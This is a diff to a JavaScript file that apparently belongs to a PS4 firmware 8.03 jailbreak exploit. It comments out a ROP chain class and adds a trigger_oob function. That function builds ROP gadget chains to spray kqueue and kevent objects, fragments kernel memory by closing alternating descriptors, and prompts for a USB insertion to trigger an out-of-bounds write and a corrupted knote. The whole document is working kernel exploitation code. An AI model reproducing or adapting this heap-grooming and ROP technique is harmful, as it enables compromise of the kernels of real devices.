@@ -245,7 +245,7 @@ function create_builtin() {
 }
 
 // Chain for PS4 8.03
-class Chain803 extends ChainBase {
+/*class Chain803 extends ChainBase {
     constructor() {
         super();
 
@@ -518,7 +518,74 @@ class Chain803 extends ChainBase {
         this.clean();
     }
 }
-const Chain = Chain803;
+const Chain = Chain803;*/
+
+function trigger_oob() {
+    init();
+    const chain = new Chain();
+    const num_kqueue = 0x1b0;
+    const kqueues = new Uint32Array(num_kqueue);
+    const kqueues_p = get_view_vector(kqueues);
+
+    for (let i = 0; i < num_kqueue; i++) {
+        chain.push_syscall('kqueue');
+        chain.push_gadget('pop rdi; ret');
+        chain.push_value(kqueues_p.add(i * 4));
+        chain.push_gadget('mov dword ptr [rdi], eax; ret');
+    }
+    chain.push_end();
+    chain.run();
+    chain.clean();
+
+    const AF_INET = 2;
+    const SOCK_STREAM = 1;
+    // socket descriptor
+    chain.syscall('socket', AF_INET, SOCK_STREAM, 0);
+    const sd = chain.return_value;
+    if (sd.low() < 0x100 || sd.low() >= 0x200) {
+        die(`invalid socket: ${sd}`);
+    }
+    debug_log(`socket descriptor: ${sd}`);
+
+    // spray kevents
+    const kevent = new Uint8Array(0x20);
+    const kevent_p = get_view_vector(kevent);
+    kevent_p.write64(0, sd);
+    // EV_ADD and EVFILT_READ
+    kevent_p.write32(0x8, 0x1ffff);
+    kevent_p.write32(0xc, 0);
+    kevent_p.write64(0x10, Int.Zero);
+    kevent_p.write64(0x18, Int.Zero);
+
+    for (let i = 0; i < num_kqueue; i++) {
+        // nchanges == 1, everything else is NULL/0
+        chain.push_syscall('kevent', kqueues[i], kevent_p, 1, 0, 0, 0);
+    }
+    chain.push_end();
+    chain.run();
+    chain.clean();
+
+    // fragment memory
+    for (let i = 18; i < num_kqueue; i += 2) {
+        chain.push_syscall('close', kqueues[i]);
+    }
+    chain.push_end();
+    chain.run();
+    chain.clean();
+
+    // trigger OOB
+    alert('insert USB');
+
+    // trigger corrupt knote
+    for (let i = 1; i < num_kqueue; i += 2) {
+        chain.push_syscall('close', kqueues[i]);
+    }
+    chain.push_end();
+    chain.run();
+    chain.clean();
+
+    alert('no kernel panic');
+}
 
 function rop() {
     const jmp_buf = new Uint8Array(jmp_buf_size);
